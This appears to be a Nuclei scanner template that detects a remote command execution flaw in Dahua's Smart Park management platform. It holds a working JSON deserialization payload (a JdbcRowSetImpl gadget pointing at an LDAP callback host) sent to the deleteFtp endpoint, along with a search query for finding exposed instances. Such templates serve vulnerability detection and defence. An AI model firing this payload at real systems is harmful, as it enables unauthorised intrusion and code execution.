id: dahua-wpms-rce

info:
  name: Dahua Smart Park Integrated Management Platform deleteFtp - Remote Command Execution
  author: DhiyaneshDK
  severity: critical
  reference:
    - https://github.com/Vme18000yuan/FreePOC/blob/master/poc/pocsuite/dahua-zhyq-deleteftp-rce.py
  metadata:
    max-request: 1
    fofa-query: body="src=\"/WPMS/asset/common/js/jsencrypt.min.js\""
  tags: rce,dahua,wpms

http:
  - method: POST
    path:
      - "{{BaseURL}}/CardSolution/card/accessControl/swingCardRecord/deleteFtp"

    headers:
      Content-Type: application/json

    body: '{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}}'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "autoCommit"

      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"
